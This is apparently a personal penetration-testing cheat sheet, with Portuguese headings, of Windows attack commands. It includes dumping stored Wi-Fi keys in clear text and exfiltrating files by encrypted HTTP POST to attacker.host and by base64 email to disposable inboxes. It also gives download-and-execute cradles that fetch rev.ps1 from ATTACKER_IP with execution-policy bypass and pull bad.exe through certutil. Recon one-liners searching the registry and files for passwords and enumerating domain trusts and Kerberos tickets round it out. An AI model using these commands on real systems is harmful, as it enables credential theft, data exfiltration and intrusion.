

# Senhas wifi
```
netsh wlan show profiles
netsh wlan show profile name="nome-rede" key=clear
```

# Upload arquivos (unico)
```
$file = Get-Content C:\Users\RayC\Desktop\xxxxx.txt
$key = (New-Object System.Text.ASCIIEncoding).GetBytes("54b8617eca0e54c7d3c8e6732c6b687a")
$securestring = new-object System.Security.SecureString
foreach ($char in $file.toCharArray()) {
      $secureString.AppendChar($char)
}
$encryptedData = ConvertFrom-SecureString -SecureString $secureString -Key $key

Invoke-WebRequest -Uri http://www.attacker.host/exfil -Method POST -Body $encryptedData

# pega o corpo da request e joga aqui >>
$key = (New-Object System.Text.ASCIIEncoding).GetBytes("54b8617eca0e54c7d3c8e6732c6b687a")
$encrypted = "corpo_request"
echo $encrypted | ConvertTo-SecureString -key $key | ForEach-Object {[Runtime.InteropServices.Marshal]::PtrToStringAuto([Runtime.InteropServices.Marshal]::SecureStringToBSTR($_))}

```
## Outro jeito (bom até 25mb):

```
Compress-Archive -Path C:\ArchiveMe -DestinationPath C:\Temp\Archive 
verificar se tenho acesso de escrita neh cabecao

$FileName = "c:\Temp\Archive.zip"
$base64string = [Convert]::ToBase64String([IO.File]::ReadAllBytes($FileName))

Send-MailMessage -From 'Attacker <attacker@example.com>' `
  -To 'test <acbc1234@sharklasers.com>' -Subject 'Data Exfil' `
  -Body $base64string -Priority High -SmtpServer 'outbound.example.com'

************** teste *********************
Send-MailMessage -From 'Atacante t_teste@dispostable.com' `
 -To 'vitima teste@dispostable.com' -Subject 'Data bla' `
-Body $base64string -Priority High -SmtpServer 'dispostable.com'
****************************************

# pega o corpo do email
echo "corpo_email" | base64 -d > arquivo.zip
unzip archive.zip
```

# Basicos
```
ver
wmic os get osarchitecture
systeminfo | findstr /B /C:"OS Name" /C:"OS Version" /C:"System Type"
hostname
whoami 
set computername
ipconfig /all
 wmic nicconfig get description,IPAddress,MACaddress
 arp -a
 netstat -ano
 netsh advfirewall show currentprofile
 netsh firewall show config
 tasklist /SVC
 reg query HKLM /f password /t REG_SZ /s
 wmic bios
 wmic product get name, version, vendor

```

# Download Arquivos
```
Copy-Item -Source \\server\share\file -Destination C:\path\
Invoke-WebRequest -Uri <source> -OutFile <destination>
Invoke-WebRequest -Uri <source> -OutFile <destination> -UseBasicParsing
Invoke-RestMethod -Uri <source> -OutFile <destination>
Start-BitsTransfer -Source <source> -Destination <destination>
wget "http://www.contoso.com" -outfile "file"
powershell.exe -v 2 -ep bypass -command "IEX (New-Object Net.WebClient).DownloadString('http://ATTACKER_IP/rev.ps1')PSByPassCLM
certutil.exe -urlcache -f http://10.0.0.5/40564.exe bad.exe

```

# Recon (basico)
```
# Systeminfo
systeminfo
hostname 

# Especially good with hotfix info
wmic qfe get Caption,Description,HotFixID,InstalledOn

# What users/localgroups are on the machine?
net users
net localgroups
net user hacker

# To see domain groups if we are in a domain
net group /domain
net group /domain 
# Network information
ipconfig /all
route print
arp -A

# To see what tokens we have 
whoami /priv

# Recursive string scan
findstr /spin "password" *.*

# Running processes
tasklist /SVC

# Network connections
netstat -ano

# Search for writeable directories
dir /a-r-d /s /b

### Some good one-liners
# Obtain the path of the executable called by a Windows service (good for checking Unquoted Paths):
sc query state= all | findstr "SERVICE_NAME:" >> a & FOR /F "tokens=2 delims= " %i in (a) DO @echo %i >> b & FOR /F %i in (b) DO @(@echo %i & @echo --------- & @sc qc %i | findstr "BINARY_PATH_NAME" & @echo.) & del a 2>nul & del b 2>nul

# current domain info
[System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()

# domain trusts
([System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()).GetAllTrustRelationships()

# current forest info
[System.DirectoryServices.ActiveDirectory.Forest]::GetCurrentForest()

# get forest trust relationships
([System.DirectoryServices.ActiveDirectory.Forest]::GetForest((New-Object System.DirectoryServices.ActiveDirectory.DirectoryContext('Forest', 'forest-of-interest.local')))).GetAllTrustRelationships()

# get DCs of a domain
nltest /dclist:offense.local
net group "domain controllers" /domain

# get DC for currently authenticated session
nltest /dsgetdc:offense.local

# get domain trusts from cmd shell
nltest /domain_trusts

# get user info
nltest /user:"spotless"

# get DC for currently authenticated session
set l

# get domain name and DC the user authenticated to
klist

# get all logon sessions. Includes NTLM authenticated sessions
klist sessions

# kerberos tickets for the session
klist

# cached krbtgt
klist tgt

# whoami on older Windows systems
set u
```
